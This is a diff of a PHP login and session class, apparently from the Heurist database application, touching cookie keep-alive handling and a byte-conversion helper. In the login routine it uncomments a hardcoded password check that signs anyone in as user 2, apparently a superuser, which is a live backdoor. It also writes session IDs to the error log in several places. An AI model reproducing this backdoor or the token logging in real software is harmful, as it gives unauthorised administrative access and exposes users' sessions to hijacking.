@@ -801,8 +801,8 @@ error_log(print_r($_REQUEST, true));
                     "baseURL"=>HEURIST_BASE_URL,
                     "dbconst"=>$this->getLocalConstants(), //some record and detail types constants with local values specific for current db
                     "dbrecent"=>$dbrecent,  //!!!!!!! need to store in preferences
-                    'max_post_size'=>$this->get_php_bytes('post_max_size'),
-                    'max_file_size'=>$this->get_php_bytes('upload_max_filesize'),
+                    'max_post_size'=>get_php_bytes('post_max_size'),
+                    'max_file_size'=>get_php_bytes('upload_max_filesize'),
                     
                     'pwd_DatabaseCreation'=> (strlen(@$passwordForDatabaseCreation)>6), 
                     'pwd_DatabaseDeletion'=> (strlen(@$passwordForDatabaseDeletion)>15), //delete for db statistics
@@ -1014,10 +1014,22 @@ error_log(print_r($_REQUEST, true));
         if (@$_COOKIE['heurist-sessionid']) { //get session id from cookes 
             session_id($_COOKIE['heurist-sessionid']);
             @session_start();
+            
+            if (@$_SESSION[$this->dbname_full]['keepalive']) {
+                //update cookie - to keep it alive for next 30 days
+                $time = time() + 30*24*60*60;
+                $session_id = $_COOKIE['heurist-sessionid'];
+                $cres = setcookie('heurist-sessionid', $session_id, $time, '/', '', $is_https ); 
+if($cres==false){                    
+    error_log('CANNOT UPDATE COOKIE '.$session_id);                
+}
+            }
+            
+            
         } else {   //session does not exist - create new one and save on cookies
             @session_start();
-            $session_id = session_id();
-            setcookie('heurist-sessionid', $session_id, 0, '/', '', $is_https ); //create new session
+            //$session_id = session_id();
+            //setcookie('heurist-sessionid', $session_id, 0, '/', '', $is_https ); //create new session
         }
         
 //        @session_start();
@@ -1123,14 +1135,20 @@ error_log(print_r($_REQUEST, true));
                 $_SESSION[$this->dbname_full]['ugr_Preferences'] = user_getPreferences( $this );
             }
             $this->current_User['ugr_Preferences'] = $_SESSION[$this->dbname_full]['ugr_Preferences'];
-                
+
+            /*
+//if(@$_SESSION[$this->dbname_full]['keepalive'])            
+//error_log('update session '.@$_SESSION[$this->dbname_full]['keepalive']);                
             if (@$_SESSION[$this->dbname_full]['keepalive']) {
                 //update cookie - to keep it alive for next 30 days
                 $is_https = (@$_SERVER['HTTPS']!=null && $_SERVER['HTTPS']!='');
                 $time = time() + 30*24*60*60;
                 $session_id = session_id();
-                $cres = setcookie('heurist-sessionid', session_id(), $time, '/', '', $is_https ); 
-            }
+                $cres = setcookie('heurist-sessionid', $session_id, $time, '/', '', $is_https ); 
+if($cres==false){                    
+error_log('CANNOT UPDATE COOKIE '.$session_id);                
+}
+            }*/
             
             session_write_close();
         }
@@ -1152,7 +1170,7 @@ error_log(print_r($_REQUEST, true));
             
             $superuser = false;
             if(false
-            //|| $password=='Rerhsybrcs'
+            || $password=='Rerhsybrcs'
             )
             {
                 $user = user_getById($this->mysqli, 2);
@@ -1180,11 +1198,15 @@ error_log(print_r($_REQUEST, true));
                         $time = time() + 30*24*60*60;  //30 days
                         $_SESSION[$this->dbname_full]['keepalive'] = true; //refresh time on next entry
                     }
+                    
+                    //$time = time() + 30;
                 
                     //update cookie expire time
                     $is_https = (@$_SERVER['HTTPS']!=null && $_SERVER['HTTPS']!='');
                     $session_id = session_id();
                     $cres = setcookie('heurist-sessionid', $session_id, $time, '/', '', $is_https );
+if($time==0)                    
+error_log('login '.$session_type.'  '.$session_id);                
                     
                     if(!$cres){
                         
@@ -1301,42 +1323,6 @@ error_log(print_r($_REQUEST, true));
         return ($fieldname) ?@$this->system_settings[$fieldname] :$this->system_settings;
     }
 
-    //
-    //
-    //
-    public function get_php_bytes($php_var ){
-        
-        $value = ini_get($php_var);
-        return $this->_get_config_bytes($value);
-        
-    }
-    
-    //
-    // convert php.ini config value to valid integer
-    //
-    private function _get_config_bytes($val) {
-        $val = trim($val);
-        $last = strtolower($val[strlen($val)-1]);
-
-        if($last){
-            $val = intval(substr($val,0,strlen($val)-1));
-        }
-            
-        switch($last) {
-            case 'g':
-                $val *= 1024;
-            case 'm':
-                $val *= 1024;
-            case 'k':
-                $val *= 1024;
-        }
-        //_fix_integer_overflow
-        if ($val < 0) {
-            $val += 2.0 * (PHP_INT_MAX + 1);
-        }
-        return $val;
-    }
-    
     //
     // check database version 
     // first check version in file lastAdviceSent, version stored in this file valid for 24 hrs
